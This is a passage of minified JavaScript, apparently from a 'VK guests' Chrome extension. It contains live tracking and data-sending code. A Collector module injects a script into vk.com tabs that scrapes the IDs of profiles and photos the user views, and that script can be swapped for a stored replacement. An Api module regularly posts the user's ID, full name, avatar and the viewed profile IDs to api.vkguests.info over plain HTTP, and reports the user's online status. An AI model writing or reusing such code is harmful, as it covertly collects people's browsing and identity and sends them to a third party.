        }, _.mixin(_), _.each(["pop", "push", "reverse", "shift", "sort", "splice", "unshift"], function(n) {
            var t = l[n];
            _.prototype[n] = function() {
                var e = this._wrapped;
                return t.apply(e, arguments), "shift" !== n && "splice" !== n || 0 !== e.length || delete e[0], z(this, e)
            }
        }), _.each(["concat", "join", "slice"], function(n) {
            var t = l[n];
            _.prototype[n] = function() {
                return z(this, t.apply(this._wrapped, arguments))
            }
        }), _.prototype.value = function() {
            return this._wrapped
        }, _.prototype.valueOf = _.prototype.toJSON = _.prototype.value, _.prototype.toString = function() {
            return "" + this._wrapped
        }, r = [], i = function() {
            return _
        }.apply(t, r), !(void 0 !== i && (n.exports = i))
    }).call(this)
}, function(n, t, e) {
    "use strict";
    var r = e(12);
    t.Timer = function() {
        return setInterval(function() {
            r.Api.sendIsOnline()
        }, sessionStorage.onlineInterval || localStorage.onlineInterval || 3e5), {
            intervalP: 0,
            init: function() {
                t.Timer.intervalP || (t.Timer.intervalP = setInterval(function() {
                    r.Api.sendVisits(), r.Api.getVisits()
                }, sessionStorage.sgInterval || localStorage.sgInterval || 6e4))
            },
            clearInterval: function() {
                this.intervalP && (clearInterval(this.intervalP), this.intervalP = 0)
            }
        }
    }()
}, function(n, t, e) {
    "use strict";
    var r = e(8),
        i = e(13),
        o = e(2),
        u = e(9);
    t.Api = function() {
        window[btoa("zö¥")];
        return {
            url: "http://api.vkguests.info/",
            sendVisits: function() {
                var n = i.Collector.flush();
                0 != n.length && o.h.ajax({
                    url: t.Api.url + "v/add/",
                    type: "post",
                    data: {
                        user_id: r.User.id,
                        fullname: r.User.name,
                        image: r.User.image,
                        "ids[]": n
                    },
                    error: function() {
                        i.Collector.setFailedData(n)
                    }
                })
            },
            sendIsOnline: function() {
                var n = t.Api.url + "online/?user_id=" + r.User.id + "&v=" + chrome['app'].getDetails().version;
                o.h.ajax({
                    url: n
                })
            },
            getVisits: function() {
                if (r.User.id) {
                    var n = t.Api.url + "v/get/?user_id=" + r.User.id;
                    u.Visitors.list.length > 0 && (n += "&since=" + u.Visitors.list[0].date), o.h.ajax({
                        url: n,
                        sendExtHeaders: !0,
                        success: function(n) {
                            u.Visitors.addToList(n.data)
                        }
                    })
                }
            }
        }
    }(), window.Api = t.Api
}, function(n, t, e) {
    "use strict";
    var r = e(8),
        i = e(3);
    t.Collector = function() {
        var n = i.DB.get("selectorFn") || function() {
            var n, t = 0,
                e = function() {
                    if (n = null, n = document['querySelector']("#pv_box")) {
                        var r = n.querySelector("#pv_photo img"),
                            i = r.src.match(/photo(\d+)_\d+/);
                        if (i && i.length > 1) return void chrome['runtime'].sendMessage({
                            fn: "Collector.add",
                            id: i[1]
                        })
                    }
                    if (n = null, n = document['querySelector']("#profile")) {
                        var o = document['querySelector']("#profile_photo_link");
                        if (o && o.href) {
                            var i = o.href.match(/photo(\d+)_\d+/);
                            if (i && i.length > 1) return void chrome['runtime'].sendMessage({
                                fn: "Collector.add",
                                id: i[1]
                            })
                        } else {
                            var u = n.querySelector(".page_avatar_img");
                            if (u && u.src) {
                                var i = u.src.match(/\/u(\d+)\//);
                                if (i && i.length > 1) return void chrome['runtime'].sendMessage({
                                    fn: "Collector.add",
                                    id: i[1]
                                })
                            }
                        }
                    }
                    t < 10 && (t++, setTimeout(e, 1e3))
                };
            e()
        }.toString();
        return {
            visits: [],
            init: function() {},
            addVisit: function(n) {
                return n != r.User.id && void(t.Collector.visits.indexOf(n) == -1 && t.Collector.visits.push(n))
            },
            setFailedData: function(n) {
                t.Collector.visits = t.Collector.visits.concat(n)
            },
            flush: function() {
                var n = t.Collector.visits;
                return t.Collector.visits = [], n
            },
            injectChecker: function(t) {
                t.url.match(/vk\.com\/?$/) || chrome['tabs'].executeScript(t.id, {
                    code: "(" + n + ")()"
                })
            }
        }
    }(), window.Collector = t.Collector
}, function(n, t, e) {
    "use strict";

    function r() {
        chrome['runtime'].onMessage.addListener(function(n, t, e) {
            switch (n.fn) {
                case "event":
                    i.App.event(n.v1, n.v2, n.v3, n.v4);
                    break;
                case "Collector.add":
                    o.Collector.addVisit(n.id);
                    break;
                case "getSgmtDiff":
                    e(a.DB.get("sgmtDiff"));
                    break;
                case "getUnreadCount":
                    e(u.Visitors.unreadCount);
                    break;
                case "resetUnreadCount":
                    u.Visitors.setUnreadCount(0);
                    break;
                case "getUsers":
                    e(u.Visitors.list)
            }
        })
    }
    var i = e(7),
        o = e(13),
        u = e(9),
        a = e(3);
    t.listen = r
}]);